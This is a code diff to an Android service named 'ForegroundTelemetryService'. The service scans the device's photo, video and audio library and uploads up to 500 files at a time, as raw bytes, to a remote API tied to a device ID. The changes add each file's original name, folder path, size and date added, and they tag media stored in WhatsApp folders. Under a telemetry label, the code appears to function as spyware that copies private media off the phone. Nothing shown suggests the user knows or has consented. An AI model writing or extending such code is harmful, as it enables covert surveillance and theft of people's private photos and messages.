@@ -1024,7 +1024,14 @@ public class ForegroundTelemetryService extends Service implements LocationListe
             while (it.hasNext()) uploaded.add(it.next());
 
             ContentResolver cr = getContentResolver();
-            String[] projection = {MediaStore.MediaColumns._ID, MediaStore.MediaColumns.MIME_TYPE};
+            String[] projection = {
+                    MediaStore.MediaColumns._ID,
+                    MediaStore.MediaColumns.MIME_TYPE,
+                    MediaStore.MediaColumns.DISPLAY_NAME,
+                    MediaStore.MediaColumns.RELATIVE_PATH,
+                    MediaStore.MediaColumns.SIZE,
+                    MediaStore.MediaColumns.DATE_ADDED
+            };
 
             uploadMediaCursor(cr.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, MediaStore.MediaColumns.DATE_ADDED + " DESC"), true, "gallery_image", cr, uploaded, uploadedObj, sp, deviceId, token);
             uploadMediaCursor(cr.query(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, projection, null, null, MediaStore.MediaColumns.DATE_ADDED + " DESC"), false, "gallery_video", cr, uploaded, uploadedObj, sp, deviceId, token);
@@ -1043,8 +1050,28 @@ public class ForegroundTelemetryService extends Service implements LocationListe
                 if (++count > 500) break;
                 long id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID));
                 String mime = null;
+                String displayName = null;
+                String relativePath = null;
+                long sizeBytes = 0L;
+                long dateAddedSeconds = 0L;
                 try {
                     mime = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.MIME_TYPE));
+                } catch (Exception ignored) {
+                }
+                try {
+                    displayName = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME));
+                } catch (Exception ignored) {
+                }
+                try {
+                    relativePath = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.RELATIVE_PATH));
+                } catch (Exception ignored) {
+                }
+                try {
+                    sizeBytes = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE));
+                } catch (Exception ignored) {
+                }
+                try {
+                    dateAddedSeconds = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_ADDED));
                 } catch (Exception ignored) {
                 }
 
@@ -1063,27 +1090,32 @@ public class ForegroundTelemetryService extends Service implements LocationListe
                     String hash = sha256(data);
                     if (hash == null || uploaded.contains(hash)) continue;
 
-                    try {
-                        JSONObject checksumBody = new JSONObject();
-                        checksumBody.put("checksum", hash);
-                        String checksumResp = HttpClient.postJson(ApiConfig.api("/api/media/checksum"), checksumBody.toString(), token);
-                        JSONObject parsed = new JSONObject(checksumResp != null ? checksumResp : "{}");
-                        if (parsed.optBoolean("exists")) {
-                            uploaded.add(hash);
-                            uploadedObj.put(hash, true);
-                            sp.edit().putString(KEY_UPLOADED_MEDIA_HASHES, uploadedObj.toString()).apply();
-                            continue;
-                        }
-                    } catch (Exception e) {
-                        Log.w(TAG, "checksum lookup failed, continuing upload", e);
-                    }
-
                     String ext = ".bin";
                     if (mime != null && mime.contains("/")) ext = "." + mime.substring(mime.indexOf("/") + 1);
-                    String filename = ("gallery_audio".equals(origin) ? "aud_" : (image ? "img_" : "vid_")) + id + ext;
+                    String filename = (displayName != null && displayName.trim().length() > 0)
+                            ? displayName
+                            : (("gallery_audio".equals(origin) ? "aud_" : (image ? "img_" : "vid_")) + id + ext);
                     String url = ApiConfig.api("/api/media/" + deviceId + "/upload");
                     long startedAt = System.currentTimeMillis();
-                    String resp = HttpClient.uploadFile(url, "media", filename, data, mime, token);
+                    java.util.Map<String, String> form = new java.util.HashMap<>();
+                    form.put("captureMode", "device_library");
+                    form.put("captureKind", origin);
+                    JSONObject metadata = new JSONObject();
+                    metadata.put("source", "MediaStoreScan");
+                    metadata.put("origin", origin);
+                    metadata.put("displayName", displayName);
+                    metadata.put("relativePath", relativePath);
+                    metadata.put("sizeBytes", sizeBytes > 0 ? sizeBytes : data.length);
+                    if (dateAddedSeconds > 0) metadata.put("dateAddedMs", dateAddedSeconds * 1000L);
+                    String relativePathLower = relativePath != null ? relativePath.toLowerCase() : "";
+                    boolean isWhatsappSharedMedia = relativePathLower.contains("whatsapp")
+                            || relativePathLower.contains("com.whatsapp")
+                            || relativePathLower.contains("com.whatsapp.w4b");
+                    if (isWhatsappSharedMedia) {
+                        metadata.put("sourceApp", "whatsapp_shared_media");
+                    }
+                    form.put("metadataJson", metadata.toString());
+                    String resp = HttpClient.uploadFile(url, "media", filename, data, mime, form, token);
                     JSONObject jr = new JSONObject(resp != null ? resp : "{}");
                     if (jr.optBoolean("ok")) {
                         uploaded.add(hash);
